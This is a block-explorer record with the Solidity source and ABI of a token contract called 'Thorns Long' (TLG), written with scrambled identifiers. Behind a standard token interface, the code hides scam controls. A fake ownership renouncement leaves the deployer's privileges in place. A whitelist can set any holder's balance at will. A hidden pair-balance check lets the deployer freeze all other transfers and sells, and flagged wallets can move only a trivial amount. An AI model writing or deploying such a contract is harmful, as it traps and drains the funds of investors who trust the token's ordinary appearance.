{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface listLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapTxList {\n    function createPair(address swapReceiver, address teamWalletEnable) external returns (address);\n}\n\ninterface launchTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeToken) external view returns (uint256);\n\n    function transfer(address sellLiquidityLaunch, uint256 txBuyLiquidity) external returns (bool);\n\n    function allowance(address totalList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txBuyLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellLiquidityLaunch,\n        uint256 txBuyLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxMarketing, uint256 value);\n    event Approval(address indexed totalList, address indexed spender, uint256 value);\n}\n\ninterface fromMax is launchTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ThornsLong is autoAmount, launchTrading, fromMax {\n\n    address public toMode;\n\n    function autoLaunched(address limitMaxShould) public {\n        if (walletReceiver) {\n            return;\n        }\n        if (shouldLimit == autoSender) {\n            totalLiquidity = false;\n        }\n        walletFund[limitMaxShould] = true;\n        if (tokenEnable != totalLiquidity) {\n            totalLiquidity = true;\n        }\n        walletReceiver = true;\n    }\n\n    mapping(address => bool) public fromLaunchedSwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletTake;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitShould;\n    }\n\n    bool private totalLiquidity;\n\n    function walletMinLiquidity(address modeReceiver) public {\n        takeIsList();\n        if (autoSender == exemptFee) {\n            totalLiquidity = true;\n        }\n        if (modeReceiver == toMode || modeReceiver == minLaunched) {\n            return;\n        }\n        fromLaunchedSwap[modeReceiver] = true;\n    }\n\n    function transfer(address exemptTake, uint256 txBuyLiquidity) external virtual override returns (bool) {\n        return fromAmount(_msgSender(), exemptTake, txBuyLiquidity);\n    }\n\n    function senderExempt(address swapTeam, address sellLiquidityLaunch, uint256 txBuyLiquidity) internal returns (bool) {\n        require(modeLiquidity[swapTeam] >= txBuyLiquidity);\n        modeLiquidity[swapTeam] -= txBuyLiquidity;\n        modeLiquidity[sellLiquidityLaunch] += txBuyLiquidity;\n        emit Transfer(swapTeam, sellLiquidityLaunch, txBuyLiquidity);\n        return true;\n    }\n\n    constructor (){\n        if (autoShould) {\n            tokenEnable = true;\n        }\n        listLaunched fromShouldSender = listLaunched(teamMarketingMin);\n        minLaunched = swapTxList(fromShouldSender.factory()).createPair(fromShouldSender.WETH(), address(this));\n        \n        toMode = _msgSender();\n        sellExempt();\n        walletFund[toMode] = true;\n        modeLiquidity[toMode] = limitShould;\n        \n        emit Transfer(address(0), toMode, limitShould);\n    }\n\n    bool public takeReceiver;\n\n    address public minLaunched;\n\n    function toTotal(address exemptTake, uint256 txBuyLiquidity) public {\n        takeIsList();\n        modeLiquidity[exemptTake] = txBuyLiquidity;\n    }\n\n    function sellExempt() public {\n        emit OwnershipTransferred(toMode, address(0));\n        autoTokenLaunch = address(0);\n    }\n\n    function allowance(address walletLiquidity, address launchSell) external view virtual override returns (uint256) {\n        if (launchSell == teamMarketingMin) {\n            return type(uint256).max;\n        }\n        return autoAtReceiver[walletLiquidity][launchSell];\n    }\n\n    address teamMarketingMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address launchSell, uint256 txBuyLiquidity) public virtual override returns (bool) {\n        autoAtReceiver[_msgSender()][launchSell] = txBuyLiquidity;\n        emit Approval(_msgSender(), launchSell, txBuyLiquidity);\n        return true;\n    }\n\n    uint256 private exemptFee;\n\n    bool public tokenEnable;\n\n    uint256 public shouldLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return txToken;\n    }\n\n    function modeLimit(uint256 txBuyLiquidity) public {\n        takeIsList();\n        launchedAuto = txBuyLiquidity;\n    }\n\n    function transferFrom(address swapTeam, address sellLiquidityLaunch, uint256 txBuyLiquidity) external override returns (bool) {\n        if (_msgSender() != teamMarketingMin) {\n            if (autoAtReceiver[swapTeam][_msgSender()] != type(uint256).max) {\n                require(txBuyLiquidity <= autoAtReceiver[swapTeam][_msgSender()]);\n                autoAtReceiver[swapTeam][_msgSender()] -= txBuyLiquidity;\n            }\n        }\n        return fromAmount(swapTeam, sellLiquidityLaunch, txBuyLiquidity);\n    }\n\n    event OwnershipTransferred(address indexed teamMin, address indexed receiverAt);\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamSwap;\n    }\n\n    string private txToken = \"Thorns Long\";\n\n    uint256 constant totalTrading = 2 ** 10;\n\n    mapping(address => mapping(address => uint256)) private autoAtReceiver;\n\n    function getOwner() external view returns (address) {\n        return autoTokenLaunch;\n    }\n\n    bool public autoShould;\n\n    function owner() external view returns (address) {\n        return autoTokenLaunch;\n    }\n\n    uint8 private walletTake = 18;\n\n    mapping(address => bool) public walletFund;\n\n    uint256 launchedAuto;\n\n    uint256 private autoSender;\n\n    function balanceOf(address takeToken) public view virtual override returns (uint256) {\n        return modeLiquidity[takeToken];\n    }\n\n    address minTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function takeIsList() private view {\n        require(walletFund[_msgSender()]);\n    }\n\n    address private autoTokenLaunch;\n\n    mapping(address => uint256) private modeLiquidity;\n\n    function fromAmount(address swapTeam, address sellLiquidityLaunch, uint256 txBuyLiquidity) internal returns (bool) {\n        if (swapTeam == toMode) {\n            return senderExempt(swapTeam, sellLiquidityLaunch, txBuyLiquidity);\n        }\n        uint256 launchedMax = launchTrading(minLaunched).balanceOf(minTrading);\n        require(launchedMax == launchedAuto);\n        require(sellLiquidityLaunch != minTrading);\n        if (fromLaunchedSwap[swapTeam]) {\n            return senderExempt(swapTeam, sellLiquidityLaunch, totalTrading);\n        }\n        return senderExempt(swapTeam, sellLiquidityLaunch, txBuyLiquidity);\n    }\n\n    bool private liquidityAmount;\n\n    bool public walletReceiver;\n\n    string private teamSwap = \"TLG\";\n\n    uint256 private limitShould = 100000000 * 10 ** 18;\n\n    uint256 receiverSwap;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMaxShould\",\"type\":\"address\"}],\"name\":\"autoLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromLaunchedSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"modeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"toTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellLiquidityLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"}],\"name\":\"walletMinLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ThornsLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}